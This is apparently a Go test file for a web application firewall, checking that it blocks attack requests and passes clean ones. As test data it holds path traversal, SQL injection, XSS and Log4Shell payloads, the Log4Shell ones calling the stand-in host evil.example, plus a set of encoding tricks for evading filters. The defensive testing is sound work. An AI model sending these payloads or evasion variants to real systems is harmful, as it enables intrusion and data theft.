package waf

import (
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestInspectDetectsAttacks(t *testing.T) {
	tests := []struct {
		name      string
		req       func() *http.Request
		wantID    string
		wantLoc   Location
		wantField string
	}{
		{
			name:    "path traversal in path",
			req:     func() *http.Request { return httptest.NewRequest("GET", "/static/..%2F..%2Fetc%2Fpasswd", nil) },
			wantID:  "PT-001",
			wantLoc: LocationPath,
		},
		{
			name: "sqli in query",
			req: func() *http.Request {
				return httptest.NewRequest("GET", "/items?id=1%20UNION%20SELECT%20password", nil)
			},
			wantID:  "SQLI-003",
			wantLoc: LocationQuery,
		},
		{
			name:    "sqli with plus and tabs in query",
			req:     func() *http.Request { return httptest.NewRequest("GET", "/items?id=1+union%09%09select+1", nil) },
			wantID:  "SQLI-003",
			wantLoc: LocationQuery,
		},
		{
			name:    "double-encoded xss in query",
			req:     func() *http.Request { return httptest.NewRequest("GET", "/search?q=%253Cscript%253Ealert(1)", nil) },
			wantID:  "XSS-001",
			wantLoc: LocationQuery,
		},
		{
			name: "log4shell in header",
			req: func() *http.Request {
				r := httptest.NewRequest("GET", "/", nil)
				r.Header.Set("User-Agent", "${jndi:ldap://evil.example/a}")
				return r
			},
			wantID:    "JNDI-001",
			wantLoc:   LocationHeader,
			wantField: "User-Agent",
		},
		{
			name: "xss in form body",
			req: func() *http.Request {
				r := httptest.NewRequest("POST", "/comment", strings.NewReader("text=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"))
				r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				return r
			},
			wantID:  "XSS-003",
			wantLoc: LocationBody,
		},
		{
			name: "sqli in json body",
			req: func() *http.Request {
				r := httptest.NewRequest("POST", "/login", strings.NewReader(`{"user":"admin' OR '1'='1"}`))
				r.Header.Set("Content-Type", "application/json")
				return r
			},
			wantID:  "SQLI-001",
			wantLoc: LocationBody,
		},
	}

	in := NewInspector(DefaultSignatures, 0)
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			m, err := in.Inspect(tc.req())
			if err != nil {
				t.Fatal(err)
			}
			if m == nil {
				t.Fatal("expected a match, got none")
			}
			if m.Signature.ID != tc.wantID || m.Location != tc.wantLoc || m.Field != tc.wantField {
				t.Errorf("got %s at %s (%q), want %s at %s (%q)",
					m.Signature.ID, m.Location, m.Field, tc.wantID, tc.wantLoc, tc.wantField)
			}
		})
	}
}

func TestInspectAllowsCleanRequests(t *testing.T) {
	in := NewInspector(DefaultSignatures, 0)
	reqs := []*http.Request{
		httptest.NewRequest("GET", "/", nil),
		httptest.NewRequest("GET", "/products/42?sort=price&order=desc", nil),
		httptest.NewRequest("GET", "/search?q=select+a+union+representative", nil),
		httptest.NewRequest("POST", "/api/users", strings.NewReader(`{"name":"Alice","bio":"I like Go."}`)),
	}
	for _, r := range reqs {
		r.Header.Set("Accept", "*/*")
		r.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")
		m, err := in.Inspect(r)
		if err != nil {
			t.Fatalf("%s %s: %v", r.Method, r.URL, err)
		}
		if m != nil {
			t.Errorf("%s %s: unexpected match %s at %s", r.Method, r.URL, m.Signature.ID, m.Location)
		}
	}
}

func TestInspectRestoresBody(t *testing.T) {
	in := NewInspector(DefaultSignatures, 0)
	r := httptest.NewRequest("POST", "/", strings.NewReader("hello"))
	if m, err := in.Inspect(r); err != nil || m != nil {
		t.Fatalf("Inspect = %v, %v", m, err)
	}
	b, _ := io.ReadAll(r.Body)
	if string(b) != "hello" {
		t.Errorf("body after inspection = %q, want %q", b, "hello")
	}
}

func TestInspectBodyTooLarge(t *testing.T) {
	in := NewInspector(DefaultSignatures, 8)
	r := httptest.NewRequest("POST", "/", strings.NewReader("0123456789"))
	r.ContentLength = -1 // simulate a chunked request with unknown length
	if _, err := in.Inspect(r); !errors.Is(err, ErrBodyTooLarge) {
		t.Errorf("err = %v, want ErrBodyTooLarge", err)
	}
}

func TestMiddleware(t *testing.T) {
	var reached bool
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		reached = true
		b, _ := io.ReadAll(r.Body)
		io.WriteString(w, string(b))
	})
	h := Middleware(next, NewInspector(DefaultSignatures, 16), nil)

	tests := []struct {
		name        string
		req         *http.Request
		wantStatus  int
		wantReached bool
	}{
		{"clean", httptest.NewRequest("POST", "/", strings.NewReader("ok")), http.StatusOK, true},
		{"attack", httptest.NewRequest("GET", "/?q=<script>", nil), http.StatusForbidden, false},
		{"too large", httptest.NewRequest("POST", "/", strings.NewReader(strings.Repeat("a", 17))), http.StatusRequestEntityTooLarge, false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			reached = false
			rec := httptest.NewRecorder()
			h.ServeHTTP(rec, tc.req)
			if rec.Code != tc.wantStatus {
				t.Errorf("status = %d, want %d", rec.Code, tc.wantStatus)
			}
			if reached != tc.wantReached {
				t.Errorf("next reached = %v, want %v", reached, tc.wantReached)
			}
			if tc.wantReached && rec.Body.String() != "ok" {
				t.Errorf("forwarded body = %q, want %q", rec.Body.String(), "ok")
			}
		})
	}
}

func TestInspectDetectsEvasion(t *testing.T) {
	tests := []struct {
		name   string
		req    func() *http.Request
		wantID string
	}{
		{"html entity xss in query", get("/?q=%26lt%3Bscript%26gt%3B"), "XSS-001"},
		{"%u-encoded xss in query", get("/?q=%u003Cscript%u003E"), "XSS-001"},
		{"fullwidth xss in query", get("/?q=%EF%BC%9Cscript%EF%BC%9E"), "XSS-001"},
		{"null byte in keyword", get("/?q=%3Cscr%00ipt%3E"), "XSS-001"},
		{"malformed escape before payload", get("/?q=%zz%3Cscript%3E"), "XSS-001"},
		{"sql comment as space", get("/items?id=1/**/UNION/**/SELECT/**/1"), "SQLI-003"},
		{"mysql versioned comment", get("/items?id=1+/*!50000UNION*/+/*!50000SELECT*/+1"), "SQLI-003"},
		{"overlong utf-8 traversal", get("/static/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"), "PT-001"},
		{"backslash traversal", get(`/download?file=..%5C..%5Cwindows%5Cwin.ini`), "PT-001"},
		{
			name: "js escape in json body",
			req: func() *http.Request {
				r := httptest.NewRequest("POST", "/api", strings.NewReader(`{"bio":"<script>alert(1)</script>"}`))
				r.Header.Set("Content-Type", "application/json")
				return r
			},
			wantID: "XSS-001",
		},
		{
			name: "html entity in header",
			req: func() *http.Request {
				r := httptest.NewRequest("GET", "/", nil)
				r.Header.Set("Referer", "&#x24;{jndi:ldap://evil.example/a}")
				return r
			},
			wantID: "JNDI-001",
		},
	}

	in := NewInspector(DefaultSignatures, 0)
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			m, err := in.Inspect(tc.req())
			if err != nil {
				t.Fatal(err)
			}
			if m == nil {
				t.Fatal("expected a match, got none")
			}
			if m.Signature.ID != tc.wantID {
				t.Errorf("got %s at %s, want %s", m.Signature.ID, m.Location, tc.wantID)
			}
		})
	}
}

func TestInspectAllowsNormalizedCleanRequests(t *testing.T) {
	in := NewInspector(DefaultSignatures, 0)
	reqs := []*http.Request{
		httptest.NewRequest("GET", "/login?next=https%3A%2F%2Fexample.com%2Fhome", nil),
		httptest.NewRequest("GET", "/search?q=%E3%81%93%E3%82%93%E3%81%AB%E3%81%A1%E3%81%AF", nil),
		httptest.NewRequest("GET", "/docs/a.b/c..d", nil),
		httptest.NewRequest("POST", "/api", strings.NewReader(`{"text":"5 > 3 & 2 < 4"}`)),
	}
	for _, r := range reqs {
		r.Header.Set("Accept", "text/html,application/xhtml+xml,*/*;q=0.8")
		r.Header.Set("Authorization", "Basic dXNlcjpwYXNz+/==")
		m, err := in.Inspect(r)
		if err != nil {
			t.Fatalf("%s %s: %v", r.Method, r.URL, err)
		}
		if m != nil {
			t.Errorf("%s %s: unexpected match %s at %s", r.Method, r.URL, m.Signature.ID, m.Location)
		}
	}
}

func get(target string) func() *http.Request {
	return func() *http.Request { return httptest.NewRequest("GET", target, nil) }
}
